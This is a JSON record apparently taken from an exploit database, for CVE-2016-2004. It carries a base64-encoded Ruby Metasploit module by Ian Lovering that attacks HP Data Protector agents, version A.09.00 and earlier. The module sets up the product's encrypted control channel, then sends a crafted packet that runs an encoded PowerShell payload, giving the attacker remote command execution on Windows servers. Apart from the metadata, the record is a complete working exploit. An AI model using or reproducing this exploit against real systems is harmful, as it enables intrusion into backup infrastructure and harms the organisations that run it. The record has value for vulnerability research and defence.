{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBEYXRhIFByb3RlY3RvciBFbmNyeXB0ZWQgQ29tbXVuaWNhdGlvbnMNCiMgRGF0ZTogMjYtMDUtMjAxNg0KIyBFeHBsb2l0IEF1dGhvcjogSWFuIExvdmVyaW5nDQojIFZlbmRvciBIb21lcGFnZTogaHR0cDovL3d3dzguaHAuY29tL3VrL2VuL3NvZnR3YXJlLXNvbHV0aW9ucy9kYXRhLXByb3RlY3Rvci1iYWNrdXAtcmVjb3Zlcnktc29mdHdhcmUvDQojIFZlcnNpb246IEEuMDkuMDAgYW5kIGVhcmxpZXINCiMgVGVzdGVkIG9uOiBXaW5kb3dzIFNlcnZlciAyMDA4DQojIENWRSA6IENWRS0yMDE2LTIwMDQNCiMNCg0KIyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ21zZi9jb3JlL2V4cGxvaXQvcG93ZXJzaGVsbCcNCg0KcmVxdWlyZSAnb3BlbnNzbCcNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6VGNwDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpQb3dlcnNoZWxsDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICA9PiAiSFAgRGF0YSBQcm90ZWN0b3IgRW5jcnlwdGVkIENvbW11bmljYXRpb24gUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uIiwNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgd2VsbCBrbm93biByZW1vdGUgY29kZSBleGVjdGlvbiBleHBsb2l0IGFmdGVyIGVzdGFibGlzaGluZyBlbmNyeXB0ZWQgY29udHJvbCBjb21tdW5pY2F0aW9ucyB3aXRoIGEgRGF0YSBQcm90ZWN0b3IgYWdlbnQuIFRoaXMgYWxsb3dzIGV4cGxvaXRhdGlvbiBvZiBEYXRhIFByb3RlY3RvciBhZ2VudHMgdGhhdCBoYXZlIGJlZW4gY29uZmlndXJlZCB0byBvbmx5IHVzZSBlbmNyeXB0ZWQgY29udHJvbCBjb21tdW5pY2F0aW9ucy4gVGhpcyBleHBsb2l0IHdvcmtzIGJ5IGV4ZWN1dGluZyB0aGUgcGF5bG9hZCB3aXRoIE1pY3Jvc29mdCBQb3dlclNoZWxsIHNvIHdpbGwgb25seSB3b3JrIGFnYWluc3QgV2luZG93cyBWaXN0YSBvciBuZXdlci4gVGVzdGVkIGFnYWluc3QgRGF0YSBQcm90ZWN0b3IgOS4wIGluc3RhbGxlZCBvbiBXaW5kb3dzIFNlcnZlciAyMDA4IFIyLiINCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9PiBbICdJYW4gTG92ZXJpbmcnIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdDVkUnLCAnMjAxNi0yMDA0JyBdLA0KICAgICAgICBdLA0KICAgICAgJ1BsYXRmb3JtJyAgICAgICA9PiAnd2luJywNCiAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0F1dG9tYXRpYycsIHsgJ0FyY2gnID0+IFsgQVJDSF9YODYsIEFSQ0hfWDg2XzY0IF0gfSBdDQogICAgICAgIF0sDQogICAgICAnUGF5bG9hZCcgICAgICAgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnQmFkQ2hhcnMnID0+ICJceDAwIg0KICAgICAgICB9LA0KICAgICAgJ0RlZmF1bHRPcHRpb25zJyAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdXZnNEZWxheScgPT4gMzAsDQogICAgICAgICAgJ1JQT1JUJyA9PiA1NTU1DQogICAgICAgIH0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiQXByIDE4IDIwMTYiLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgIyBGb3IgdGhlIGNoZWNrIGNvbW1hbmQNCiAgICBjb25uZWN0DQogICAgc29jay5wdXQocmFuZF90ZXh0X2FscGhhX3VwcGVyKDY0KSkNCiAgICByZXNwb25zZSA9IHNvY2suZ2V0X29uY2UoLTEpDQogICAgZGlzY29ubmVjdA0KDQogICAgaWYgcmVzcG9uc2UubmlsPw0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KICAgIGVuZA0KDQogICAgc2VydmljZV92ZXJzaW9uID0gUmV4OjpUZXh0LnRvX2FzY2lpKHJlc3BvbnNlKS5jaG9wLmNob21wDQoNCiAgICBpZiBzZXJ2aWNlX3ZlcnNpb24gPX4gL0hQIERhdGEgUHJvdGVjdG9yLw0KICAgICAgcHJpbnRfc3RhdHVzKHNlcnZpY2VfdmVyc2lvbikNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkRldGVjdGVkDQogICAgZW5kDQoNCiAgICBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCg0KICBlbmQNCg0KICBkZWYgZ2VuZXJhdGVfZHBfcGF5bG9hZA0KDQogICAgY29tbWFuZCA9IGNtZF9wc2hfcGF5bG9hZCgNCiAgICAgIHBheWxvYWQuZW5jb2RlZCwNCiAgICAgIHBheWxvYWRfaW5zdGFuY2UuYXJjaC5maXJzdCwNCiAgICAgIHsgcmVtb3ZlX2NvbXNwZWM6IHRydWUsIGVuY29kZV9maW5hbF9wYXlsb2FkOiB0cnVlIH0pDQoNCiAgICBwYXlsb2FkID0NCiAgICAgICJceDMyXHgwMFx4MDFceDAxXHgwMVx4MDFceDAxXHgwMSIgKw0KICAgICAgIlx4MDBceDAxXHgwMFx4MDFceDAwXHgwMVx4MDBceDAxIiArDQogICAgICAiXHgwMVx4MDBceDIwXHgzMlx4MzhceDAwXHg1Y1x4NzAiICsNCiAgICAgICJceDY1XHg3Mlx4NmNceDJlXHg2NVx4NzhceDY1XHgwMCIgKw0KICAgICAgIlx4MjBceDJkXHg2NVx4NzNceDc5XHg3M1x4NzRceDY1IiArDQogICAgICAiXHg2ZCgnI3tjb21tYW5kfScpXHgwMCINCg0KICAgIHBheWxvYWRfbGVuZ3RoID0gW3BheWxvYWQubGVuZ3RoXS5wYWNrKCdOJykNCg0KICAgIHJldHVybiBwYXlsb2FkX2xlbmd0aCArIHBheWxvYWQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICAjIE1haW4gZnVuY3Rpb24NCiAgICBlbmNyeXB0aW9uX2luaXRfZGF0YSA9DQogICAgICAiXHgwMFx4MDBceDAwXHg0OFx4ZmZceGZlXHgzMlx4MDBceDM2XHgwMFx4MzdceDAwXHgwMFx4MDBceDIwXHgwMCIgKw0KICAgICAgIlx4MzFceDAwXHgzMFx4MDBceDAwXHgwMFx4MjBceDAwXHgzMVx4MDBceDMwXHgwMFx4MzBceDAwXHgwMFx4MDAiICsNCiAgICAgICJceDIwXHgwMFx4MzlceDAwXHgzMFx4MDBceDMwXHgwMFx4MDBceDAwXHgyMFx4MDBceDM4XHgwMFx4MzhceDAwIiArDQogICAgICAiXHgwMFx4MDBceDIwXHgwMFx4NmZceDAwXHg2ZFx4MDBceDZlXHgwMFx4NjlceDAwXHg2NFx4MDBceDZjXHgwMCIgKw0KICAgICAgIlx4NjNceDAwXHgwMFx4MDBceDIwXHgwMFx4MzRceDAwXHgwMFx4MDBceDAwXHgwMCINCg0KICAgIHByaW50X3N0YXR1cygiSW5pdGlhdGluZyBjb25uZWN0aW9uIikNCg0KICAgICMgT3BlbiBjb25uZWN0aW9uDQogICAgY29ubmVjdA0KDQogICAgIyBTZW5kIGluaXQgZGF0YQ0KICAgIHNvY2sucHV0KGVuY3J5cHRpb25faW5pdF9kYXRhKQ0KICAgIGJlZ2luDQogICAgICBidWYgPSBzb2NrLmdldF9vbmNlDQogICAgcmVzY3VlIDo6RU9GRXJyb3INCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiRXN0YWJsaXNoaW5nIGVuY3J5cHRlZCBjaGFubmVsIikNCg0KICAgICMgQ3JlYXRlIFRMUyAvIFNTTCBjb250ZXh0DQogICAgc29jay5leHRlbmQoUmV4OjpTb2NrZXQ6OlNzbFRjcCkNCiAgICBzb2NrLnNzbGN0eCAgPSBPcGVuU1NMOjpTU0w6OlNTTENvbnRleHQubmV3KDpTU0x2MjMpDQogICAgc29jay5zc2xjdHgudmVyaWZ5X21vZGUgPSBPcGVuU1NMOjpTU0w6OlZFUklGWV9OT05FDQoNCiAgICBzb2NrLnNzbGN0eC5vcHRpb25zID0gT3BlblNTTDo6U1NMOjpPUF9BTEwNCg0KICAgICMgRW5hYmxlIFRMUyAvIFNTTA0KICAgIHNvY2suc3Nsc29jayA9IE9wZW5TU0w6OlNTTDo6U1NMU29ja2V0Lm5ldyhzb2NrLCBzb2NrLnNzbGN0eCkNCiAgICBzb2NrLnNzbHNvY2suY29ubmVjdA0KDQogICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIHBheWxvYWQiKQ0KDQogICAgIyBTZW5kIHBheWxvYWQNCiAgICBzb2NrLnB1dChnZW5lcmF0ZV9kcF9wYXlsb2FkKCksIHt0aW1lb3V0OiA1fSkNCg0KICAgICMgQ2xvc2Ugc29ja2V0DQogICAgZGlzY29ubmVjdA0KDQogICAgcHJpbnRfc3RhdHVzKCJXYWl0aW5nIGZvciBwYXlsb2FkIGV4ZWN1dGlvbiAodGhpcyBjYW4gdGFrZSB1cCB0byAzMCBzZWNvbmRzIG9yIHNvKSIpDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/windows/remote/39874.rb", 
    "id": "39874", 
    "cves": [
        "CVE-2016-2004"
    ]
}